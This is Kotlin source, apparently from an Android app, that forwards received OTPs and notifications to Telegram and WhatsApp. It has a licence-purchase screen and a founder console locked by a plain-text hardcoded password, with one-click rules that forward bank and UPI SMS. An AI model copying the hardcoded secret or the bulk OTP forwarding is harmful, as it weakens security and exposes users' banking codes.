            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text("📜 Forwarded OTP Logs", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = TextPrimary)
            Row(verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = {
                    historyList = HistoryManager.getHistory(context)
                }) {
                    Text("🔄", fontSize = 16.sp)
                }
                if (historyList.isNotEmpty()) {
                    TextButton(onClick = {
                        HistoryManager.clearHistory(context)
                        historyList = emptyList()
                    }) {
                        Text("Clear All", color = Color(0xFFEF4444), fontSize = 12.sp)
                    }
                }
            }
        }

        // 24h Auto-Clear History Toggle Card
        MncCard(modifier = Modifier.padding(vertical = 8.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🗑️ Auto-Delete Logs (>24 Hours)", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentAmber)
                    Text("24h purane OTP records phone se auto-delete honge", fontSize = 10.sp, color = TextSecondary)
                }
                Switch(
                    checked = isAutoClearHistory,
                    onCheckedChange = { checked ->
                        isAutoClearHistory = checked
                        prefs.edit().putBoolean("auto_clear_history_24h", checked).apply()
                        if (checked) {
                            HistoryManager.pruneOldHistory(context)
                            historyList = HistoryManager.getHistory(context)
                        }
                    }
                )
            }
        }

        if (historyList.isEmpty()) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text(
                    text = "Abhi tak koi OTP forward nahi hua hai.\nJaise hi koi OTP aayega, uska record yahan dikhega.",
                    fontSize = 12.sp,
                    color = TextMuted,
                    textAlign = TextAlign.Center
                )
            }
        } else {
            LazyColumn(modifier = Modifier.fillMaxSize()) {
                items(historyList) { item ->
                    MncCard(modifier = Modifier.padding(vertical = 4.dp)) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("From: ${item.sender}", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF60A5FA))
                                Text(item.timestamp, fontSize = 11.sp, color = TextMuted)
                            }
                            Spacer(modifier = Modifier.height(4.dp))
                            Text("🔑 OTP: ${item.otp}", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = AccentEmerald)
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(item.fullMessage, fontSize = 11.sp, color = TextSecondary)
                            Spacer(modifier = Modifier.height(8.dp))
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                MncStatusBadge(label = "TG 1", status = item.telegramStatus)
                                if (item.telegram2Status != "Disabled") {
                                    MncStatusBadge(label = "TG 2", status = item.telegram2Status)
                                }
                                MncStatusBadge(label = "WhatsApp", status = item.whatsappStatus)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun ProPaytmTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()
    val deviceId = remember { CloudflareLicenseManager.getDeviceId(context) }

    var isMaster = remember { CloudflareLicenseManager.isMasterFounder(context) }
    var isLicensed by remember { mutableStateOf(CloudflareLicenseManager.isLicenseActive(context)) }
    var licenseInput by remember { mutableStateOf("") }
    var activateStatus by remember { mutableStateOf("") }
    var trialInfo by remember { mutableStateOf("Checking trial...") }

    LaunchedEffect(Unit) {
        val trialRes = CloudflareLicenseManager.checkOrStartTrial(context)
        trialInfo = trialRes.second
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Membership Status Banner
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                if (isMaster) {
                    Text("👑 MASTER FOUNDER ACCESS ACTIVE", fontWeight = FontWeight.ExtraBold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                    Text("Unlimited Forever · All Portals & Bypass Active", fontSize = 11.sp, color = AccentEmerald)
                } else if (isLicensed) {
                    Text("⭐ PRO LICENSE ACTIVE", fontWeight = FontWeight.ExtraBold, fontSize = 15.sp, color = AccentEmerald)
                    Text("Hardware Locked · Full 24/7 Access Active", fontSize = 11.sp, color = TextSecondary)
                } else {
                    Text("⏳ STATUS: $trialInfo", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = AccentAmber)
                    Text("Trial khatam hone ke baad continue rakhne ke liye Pro license unlock karein.", fontSize = 11.sp, color = TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // PayTM & License Purchase Card
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("💎 Smart Notifier Lifetime Pro", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFA5B4FC))
                Text("Price: ₹199 (One-Time Lifetime)", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = AccentEmerald)
                Spacer(modifier = Modifier.height(10.dp))

                // PayTM Details
                Surface(
                    color = Color(0xFF0F172A),
                    shape = RoundedCornerShape(10.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column {
                            Text("PayTM / PhonePe / GPay Number:", fontSize = 10.sp, color = TextMuted)
                            Text("8006518960", fontSize = 16.sp, fontWeight = FontWeight.ExtraBold, color = Color.White)
                        }
                        Button(
                            onClick = {
                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                clipboard.setPrimaryClip(ClipData.newPlainText("PayTM No", "8006518960"))
                                Toast.makeText(context, "Number Copied: 8006518960", Toast.LENGTH_SHORT).show()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                        ) {
                            Text("Copy", fontSize = 11.sp)
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Hardware Device ID
                Surface(
                    color = Color(0xFF0F172A),
                    shape = RoundedCornerShape(10.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Your Phone Hardware ID:", fontSize = 10.sp, color = TextMuted)
                            Text(deviceId, fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color(0xFF67E8F9))
                        }
                        Button(
                            onClick = {
                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                clipboard.setPrimaryClip(ClipData.newPlainText("Device ID", deviceId))
                                Toast.makeText(context, "Device ID Copied!", Toast.LENGTH_SHORT).show()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0284C7)),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                        ) {
                            Text("Copy", fontSize = 11.sp)
                        }
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))

                // WhatsApp Direct Order Button
                Button(
                    onClick = {
                        try {
                            val msg = "Hello bhaiya, maine 8006518960 par ₹199 PayTM kar diya hai. Mera Smart Notifier Device ID hai: $deviceId. Kripya License Key bhej dijiye."
                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/918006518960?text=${Uri.encode(msg)}"))
                            context.startActivity(intent)
                        } catch (e: Exception) {
                            Toast.makeText(context, "WhatsApp open error: ${e.message}", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(46.dp)
                ) {
                    Text("💬 Send Receipt & Get Key on WhatsApp", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }

                Spacer(modifier = Modifier.height(16.dp))
                HorizontalDivider(color = CardBorder)
                Spacer(modifier = Modifier.height(16.dp))

                // Enter License Key
                Text("Activate License Key:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                Spacer(modifier = Modifier.height(6.dp))
                MncTextField(value = licenseInput, onValueChange = { licenseInput = it }, label = "License Key (e.g. SN-XXXX-XXXX)")
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        activateStatus = "Activating on Cloudflare..."
                        scope.launch {
                            val res = CloudflareLicenseManager.activateLicense(context, licenseInput)
                            activateStatus = if (res.first) "✅ ${res.second}" else "❌ ${res.second}"
                            if (res.first) isLicensed = true
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(46.dp)
                ) {
                    Text("🚀 Unlock Pro Lifetime", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                }

                if (activateStatus.isNotEmpty()) {
                    Text(
                        text = activateStatus,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (activateStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                        modifier = Modifier.padding(top = 6.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FounderConsoleScreen(
    context: Context,
    onExit: () -> Unit
) {
    BackHandler(enabled = true) { onExit() }

    val scope = rememberCoroutineScope()
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var inputPassword by remember { mutableStateOf("") }
    var isAuthorized by remember { mutableStateOf(CloudflareLicenseManager.isMasterFounder(context)) }

    // If not authorized, show Full Screen Executive Login
    if (!isAuthorized) {
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF090D1A))
                .padding(24.dp),
            contentAlignment = Alignment.Center
        ) {
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF111827)),
                border = BorderStroke(1.dp, Color(0xFF312E81)),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                Column(
                    modifier = Modifier.padding(28.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Box(
                        modifier = Modifier
                            .size(72.dp)
                            .clip(CircleShape)
                            .background(Color(0xFF1E1B4B))
                            .border(2.dp, Color(0xFFF59E0B), CircleShape),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("👑", fontSize = 36.sp)
                    }

                    Spacer(modifier = Modifier.height(18.dp))

                    Text(
                        text = "Founder Console Access",
                        fontSize = 20.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = Color(0xFFFBBF24)
                    )

                    Spacer(modifier = Modifier.height(6.dp))

                    Text(
                        text = "Enter 15-Digit Master Security Password to access enterprise management, customer tickets & license keys.",
                        fontSize = 12.sp,
                        color = Color(0xFF94A3B8),
                        textAlign = TextAlign.Center
                    )

                    Spacer(modifier = Modifier.height(24.dp))

                    OutlinedTextField(
                        value = inputPassword,
                        onValueChange = { inputPassword = it },
                        label = { Text("Master Security Password", color = Color(0xFF94A3B8), fontSize = 12.sp) },
                        placeholder = { Text("Enter Master Password...", color = Color(0xFF64748B), fontSize = 12.sp) },
                        shape = RoundedCornerShape(12.dp),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedTextColor = Color.White,
                            unfocusedTextColor = Color.White,
                            focusedBorderColor = Color(0xFF6366F1),
                            unfocusedBorderColor = Color(0xFF334155),
                            focusedContainerColor = Color(0xFF090D1A),
                            unfocusedContainerColor = Color(0xFF090D1A)
                        ),
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(20.dp))

                    Button(
                        onClick = {
                            if (inputPassword.trim() == "910010025123343") {
                                isAuthorized = true
                                Toast.makeText(context, "✅ Welcome Ankit - Founder Access Granted", Toast.LENGTH_SHORT).show()
                            } else {
                                Toast.makeText(context, "❌ Invalid Master Security Password", Toast.LENGTH_SHORT).show()
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.fillMaxWidth().height(50.dp)
                    ) {
                        Text("🔓 Unlock Executive Console", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = Color.White)
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    OutlinedButton(
                        onClick = onExit,
                        shape = RoundedCornerShape(12.dp),
                        border = BorderStroke(1.dp, Color(0xFF334155)),
                        modifier = Modifier.fillMaxWidth().height(48.dp)
                    ) {
                        Text("Cancel & Return to App", color = Color(0xFF94A3B8), fontSize = 13.sp)
                    }
                }
            }
        }
        return
    }

    // Authorized State: Full Screen Console with 4 Tabs
    var selectedTab by remember { mutableStateOf(0) } // 0: Overview, 1: Rules & eDistrict, 2: Support Desk, 3: License Keys

    // Tab Data states
    var generatedKey by remember { mutableStateOf("") }
    var isGeneratingKey by remember { mutableStateOf(false) }

    // Support Desk states
    var messagesList by remember { mutableStateOf(SupportChatManager.getMessages(context)) }

    // Rules states
    var forwardAllState by remember { mutableStateOf(prefs.getBoolean("forward_all_notifications", false)) }
    var keywordsList by remember { mutableStateOf(KeywordManager.getKeywords(context)) }

    Scaffold(
        topBar = {
            TopAppBar(
                navigationIcon = {
                    IconButton(onClick = onExit) {
                        Text("←", fontSize = 24.sp, color = Color.White, fontWeight = FontWeight.Bold)
                    }
                },
                title = {
                    Column {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text("👑 FOUNDER CONSOLE", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFFBBF24))
                            Spacer(modifier = Modifier.width(8.dp))
                            Surface(
                                color = Color(0xFF78350F),
                                shape = RoundedCornerShape(4.dp)
                            ) {
                                Text(
                                    text = "ANKIT",
                                    fontSize = 9.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFFFDE68A),
                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                                )
                            }
                        }
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(modifier = Modifier.size(6.dp).clip(CircleShape).background(Color(0xFF10B981)))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Cloudflare KV: Bound • v4.5 Enterprise", fontSize = 10.sp, color = Color(0xFF94A3B8))
                        }
                    }
                },
                actions = {
                    OutlinedButton(
                        onClick = onExit,
                        border = BorderStroke(1.dp, Color(0xFFEF4444)),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFEF4444)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                        modifier = Modifier.padding(end = 8.dp)
                    ) {
                        Text("Exit ⎋", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF0F172A))
            )
        },
        containerColor = Color(0xFF090D1A)
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
        ) {
            // Luxury Tab Selector Bar
            Surface(
                color = Color(0xFF0F172A),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 12.dp, vertical = 8.dp),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    val tabs = listOf(
                        "📊 Overview",
                        "🏢 Rules",
                        "💬 Support (${messagesList.count { it.sender == "USER" }})",
                        "🔑 Licenses"
                    )
                    tabs.forEachIndexed { index, title ->
                        val isSelected = selectedTab == index
                        Surface(
                            modifier = Modifier
                                .weight(1f)
                                .height(38.dp)
                                .clip(RoundedCornerShape(8.dp))
                                .clickable { selectedTab = index },
                            color = if (isSelected) Color(0xFF312E81) else Color(0xFF1E293B),
                            border = if (isSelected) BorderStroke(1.dp, Color(0xFF818CF8)) else BorderStroke(1.dp, Color(0xFF334155)),
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Text(
                                    text = title,
                                    fontSize = 11.sp,
                                    fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium,
                                    color = if (isSelected) Color(0xFFFBBF24) else Color(0xFFCBD5E1)
                                )
                            }
                        }
                    }
                }
            }

            // Tab Content
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(horizontal = 16.dp, vertical = 12.dp)
            ) {
                when (selectedTab) {
                    0 -> FounderOverviewTab(
                        context = context,
                        onActivateEdistrict = {
                            CloudflareLicenseManager.activateMasterFounder(context)
                            Toast.makeText(context, "✅ eDistrict Profile Permanently Loaded!", Toast.LENGTH_LONG).show()
                        },
                        onNavigateTab = { selectedTab = it },
                        totalTickets = messagesList.size
                    )
                    1 -> FounderRulesTab(
                        context = context,
                        forwardAllState = forwardAllState,
                        onForwardAllChange = { checked ->
                            forwardAllState = checked
                            prefs.edit().putBoolean("forward_all_notifications", checked).apply()
                        },
                        keywordsList = keywordsList,
                        onResetEdistrict = {
                            keywordsList = KeywordManager.resetDefaults(context)
                            Toast.makeText(context, "✅ eDistrict UP Rules Loaded!", Toast.LENGTH_SHORT).show()
                        },
                        onAddBankRules = {
                            val bankRules = listOf("SBI", "HDFC", "ICICI", "PNB", "AXIS", "PAYTM", "GPAY")
                            bankRules.forEach { KeywordManager.addKeyword(context, it) }
                            keywordsList = KeywordManager.getKeywords(context)
                            Toast.makeText(context, "✅ Bank & UPI Rules Loaded!", Toast.LENGTH_SHORT).show()
                        },
                        onAddKeyword = { kw ->
                            if (kw.isNotBlank()) {
                                keywordsList = KeywordManager.addKeyword(context, kw.trim())
                            }
                        },
                        onRemoveKeyword = { kw ->
                            keywordsList = KeywordManager.removeKeyword(context, kw)
                        }
                    )
                    2 -> FounderSupportTab(
                        context = context,
                        messagesList = messagesList,
                        onRefreshMessages = { messagesList = SupportChatManager.getMessages(context) }
                    )
                    3 -> FounderLicenseTab(
                        context = context,
                        generatedKey = generatedKey,
                        isGenerating = isGeneratingKey,
                        onGenerateKey = {
                            scope.launch {
                                isGeneratingKey = true
                                val res = CloudflareLicenseManager.generateCustomerKey(context, "910010025123343")
                                if (res.first) {
                                    generatedKey = res.second
                                    Toast.makeText(context, "✅ New License Key Generated!", Toast.LENGTH_SHORT).show()
                                } else {
                                    Toast.makeText(context, "❌ ${res.second}", Toast.LENGTH_LONG).show()
                                }
                                isGeneratingKey = false
                            }
                        }
                    )
                }
            }
        }
    }
}

@Composable
fun FounderOverviewTab(
    context: Context,
    onActivateEdistrict: () -> Unit,
    onNavigateTab: (Int) -> Unit,
    totalTickets: Int
) {
    val historyCount = remember { HistoryManager.getHistory(context).size }
    val deviceId = remember { CloudflareLicenseManager.getDeviceId(context) }
    val scope = rememberCoroutineScope()
    var pingStatus by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // 4 KPI Stat Cards Grid (2 rows x 2 cards)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
            // Card 1: Forwarded OTPs
            Surface(
                modifier = Modifier.weight(1f),
                color = Color(0xFF131B2E),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, Color(0xFF1E293B))
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                        Text("⚡ OTPs", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFF94A3B8))
                        Text("Today", fontSize = 9.sp, color = Color(0xFF64748B))
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("$historyCount", fontSize = 22.sp, fontWeight = FontWeight.ExtraBold, color = Color(0xFF38BDF8))
                    Text("Total forwarded", fontSize = 10.sp, color = Color(0xFF64748B))
                }
            }

            // Card 2: Support Tickets
            Surface(
                modifier = Modifier.weight(1f).clickable { onNavigateTab(2) },
                color = Color(0xFF131B2E),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, if (totalTickets > 0) Color(0xFF6366F1) else Color(0xFF1E293B))
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                        Text("💬 Tickets", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFF94A3B8))
                        if (totalTickets > 0) {
                            Surface(color = Color(0xFF312E81), shape = RoundedCornerShape(4.dp)) {
                                Text("Inbox", fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Color(0xFFA5B4FC), modifier = Modifier.padding(horizontal = 4.dp, vertical = 1.dp))
                            }
                        }
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("$totalTickets", fontSize = 22.sp, fontWeight = FontWeight.ExtraBold, color = Color(0xFFFBBF24))
                    Text("Customer queries", fontSize = 10.sp, color = Color(0xFF64748B))
                }
            }
        }

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
            // Card 3: System Engine Status
            Surface(
                modifier = Modifier.weight(1f),
                color = Color(0xFF131B2E),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, Color(0xFF1E293B))
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Text("🛡️ Daemon", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFF94A3B8))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("RUNNING", fontSize = 16.sp, fontWeight = FontWeight.ExtraBold, color = Color(0xFF34D399))
                    Text("24/7 Doze-Proof", fontSize = 10.sp, color = Color(0xFF64748B))
                }
            }

            // Card 4: Founder License Status
            Surface(
                modifier = Modifier.weight(1f),
                color = Color(0xFF131B2E),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, Color(0xFF78350F))
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Text("👑 Tier", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFF59E0B))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text("FOUNDER", fontSize = 16.sp, fontWeight = FontWeight.ExtraBold, color = Color(0xFFFBBF24))
                    Text("Device ${deviceId.take(8)}", fontSize = 10.sp, color = Color(0xFF64748B))
                }
            }
        }

        // Fast Action 1: Permanent Founder eDistrict Activation
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF064E3B),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF059669))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("🚀 Activate My eDistrict Setup (Permanent)", fontWeight = FontWeight.ExtraBold, fontSize = 14.sp, color = Color.White)
                }
                Spacer(modifier = Modifier.height(4.dp))
                Text("Is phone par Ankit founder profile, default Telegram bot aur eDistrict channel permanently configure karein.", fontSize = 11.sp, color = Color(0xFFA7F3D0))
                Spacer(modifier = Modifier.height(12.dp))
                Button(
                    onClick = onActivateEdistrict,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(44.dp)
                ) {
                    Text("⚡ Permanent Activate Now", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color.Black)
                }
            }
        }

        // Fast Action 2: Connection Test Ping
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("📡 Founder Engine Ping Test", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFF8FAFC))
                Text("Apne primary Telegram channel par live verification test message bhejein:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        pingStatus = "Sending ping..."
                        scope.launch {
                            val res = TelegramHelper.sendMessage(
                                TelegramHelper.DEFAULT_BOT_TOKEN,
                                TelegramHelper.DEFAULT_CHANNEL_ID,
                                "👑 Founder Ping Test from Smart Notifier Console (Device: ${deviceId.take(8)}) - Everything OK!"
                            )
                            pingStatus = if (res.first) "✅ Telegram 1-Sec Ping Successful!" else "❌ Ping Failed: ${res.second}"
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF312E81)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(44.dp)
                ) {
                    Text("📲 Test Channel Ping", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = Color(0xFFA5B4FC))
                }
                if (pingStatus.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(pingStatus, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (pingStatus.startsWith("✅")) Color(0xFF34D399) else Color(0xFFF87171))
                }
            }
        }
    }
}

@Composable
fun FounderRulesTab(
    context: Context,
    forwardAllState: Boolean,
    onForwardAllChange: (Boolean) -> Unit,
    keywordsList: List<String>,
    onResetEdistrict: () -> Unit,
    onAddBankRules: () -> Unit,
    onAddKeyword: (String) -> Unit,
    onRemoveKeyword: (String) -> Unit
) {
    var newKeyword by remember { mutableStateOf("") }
    var testSender by remember { mutableStateOf("AD-UPEGOV-S") }
    var testBody by remember { mutableStateOf("OTP for Authentication is : 240833 --eDistrict UP") }
    var testVerdict by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // 1-Click Rule Presets
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("⚡ 1-Click Rule Presets", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFFBBF24))
                Text("Rules engine me single click par official rules load karein:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(12.dp))

                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                    Button(
                        onClick = onResetEdistrict,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.weight(1f).height(46.dp)
                    ) {
                        Text("🏢 eDistrict UP", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                    Button(
                        onClick = onAddBankRules,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.weight(1f).height(46.dp)
                    ) {
                        Text("🏦 Banks & UPI", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // Forward ALL Switch Card
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, if (forwardAllState) Color(0xFFF59E0B) else Color(0xFF1E293B))
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Forward ALL Notifications", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
                    Text(
                        if (forwardAllState) "🟢 ON: Har SMS aur Notification forward hoga" else "⚪ OFF: Sirf filtered keywords hi forward honge",
                        fontSize = 11.sp,
                        color = Color(0xFF94A3B8)
                    )
                }
                Switch(
                    checked = forwardAllState,
                    onCheckedChange = onForwardAllChange,
                    colors = SwitchDefaults.colors(
                        checkedThumbColor = Color.White,
                        checkedTrackColor = Color(0xFFF59E0B),
                        uncheckedThumbColor = Color.Gray,
                        uncheckedTrackColor = Color(0xFF1E293B)
                    )
                )
            }
        }

        // Active Keywords Chips Card
        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color(0xFF131B2E),
            shape = RoundedCornerShape(16.dp),
            border = BorderStroke(1.dp, Color(0xFF1E293B))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("🏷️ Active Keywords & Senders (${keywordsList.size})", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color.White)
                Text("In words ya sender names wale SMS/Notifications forward honge:", fontSize = 11.sp, color = Color(0xFF94A3B8))
                Spacer(modifier = Modifier.height(12.dp))

                // Add Keyword Row
                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(
                        value = newKeyword,
                        onValueChange = { newKeyword = it },
                        placeholder = { Text("Add custom keyword (e.g. CSC)", fontSize = 12.sp, color = Color(0xFF64748B)) },
                        shape = RoundedCornerShape(10.dp),
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedContainerColor = Color(0xFF0F172A),
                            unfocusedContainerColor = Color(0xFF0F172A),
                            focusedTextColor = Color.White,
                            unfocusedTextColor = Color.White,
